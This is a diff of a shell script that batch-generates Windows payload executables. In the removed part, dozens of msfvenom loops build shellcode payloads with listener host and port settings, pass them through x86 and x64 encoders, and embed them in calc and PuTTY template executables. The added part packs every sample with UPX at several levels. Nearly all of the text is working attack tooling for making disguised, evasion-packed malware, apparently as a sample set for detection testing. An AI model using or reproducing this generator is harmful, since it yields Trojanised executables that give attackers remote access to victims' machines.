+		upx -q -1 -o samples/${NAME}_upx_fast.exe samples/$i | tail -n 4 >> upx.log
+		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+		TIME=$(( $TIME + $DELTA ))
+		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+		I=$((I+1))
+
+		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+		tput clear
+		tput cup 0 0
+		echo "UPX: normal"
+		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+		upx -q -o samples/${NAME}_upx_default.exe samples/$i | tail -n 4 >> upx.log
+		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+		TIME=$(( $TIME + $DELTA ))
+		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+		I=$((I+1))
+
+		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+		tput clear
+		tput cup 0 0
+		echo "UPX: best"
+		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+		upx -q --best -o samples/${NAME}_upx_best.exe samples/$i | tail -n 4 >> upx.log
+		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+		TIME=$(( $TIME + $DELTA ))
+		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+		I=$((I+1))
+
+		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
+		tput clear
+		tput cup 0 0
+		echo "UPX: ultra brute"
+		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME"
+		EPOCH=$(( `date +%s%N`/1000000 )) # milisec
+		upx -q --ultra-brute -o samples/${NAME}_upx_ubrute.exe samples/$i | tail -n 4 >> upx.log
+		DELTA=$(( `date +%s%N`/1000000 - $EPOCH ))
+		TIME=$(( $TIME + $DELTA ))
+		TIMELEFT=`echo "( ($TIME / $I * $ITERATIONS) - $TIME) / 60 / 1000" | bc`
+		I=$((I+1))
+	done
+}
 
 if [ ! -e samples ]; then
 	mkdir samples
@@ -58,260 +506,5 @@ for b in "${BIN[@]}"; do
     fi
 done
 
-for EXITFUNC in "${EXITFUNCTIONS[@]}"; do
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo -e "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_calc_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_simple_putty_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_SIMPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_calc_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_CALC_X86_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x86_multi_putty_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x86_MULTIPLE -f raw | $TEMPLATE_PUTTY_X86_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_calc_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_simple_putty_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_SIMPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_calc_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_CALC_X64_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64 -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-	for SHELLCODE in "${SHELLCODES[@]}"; do
-		NAME=`echo ${SHELLCODE} | tr '/' '-'`_${EXITFUNC}_enc_x64_multi_putty_c.exe
-		PROC=`echo "scale=2; $I * 100 / $ITERATIONS" | bc | awk '{printf("%02.2f%", $0)}'`
-		echo "[$I/$ITERATIONS -> $PROC -> $TIMELEFT min] Generating $NAME\n"
-		EPOCH=`date +%s`
-		msfvenom -p windows/${SHELLCODE} EXITFUN=${EXITFUNC} KHOST=$KHOST AHOST=$AHOST RC4PASSWORD="$RC4PASSWORD" LPORT=$LPORT LHOST=$LHOST LHOST_IPV6=$LHOST_IPV6 -f raw | $ENCODING_x64_MULTIPLE -f raw | $TEMPLATE_PUTTY_X64_c -f exe -o samples/$NAME
-		DELTA=$(( `date +%s` - $EPOCH ))
-		TIME=$(( $DELTA + $TIME ))
-		TIMELEFT=$(( ( ($TIME / $I * $ITERATIONS) - $TIME) / 60 ))
-		I=$((I+1))
-	done
-
-done
-
-for i in `ls samples`; do name=`echo $i | sed 's/.exe//'`; upx -1 -o samples/${name}_upx_fast.exe samples/$i; upx -o samples/${name}_upx_default.exe samples/$i; upx --best -o samples/${name}_upx_best.exe samples/$i; done
-
+gen_samples
+gen_upx
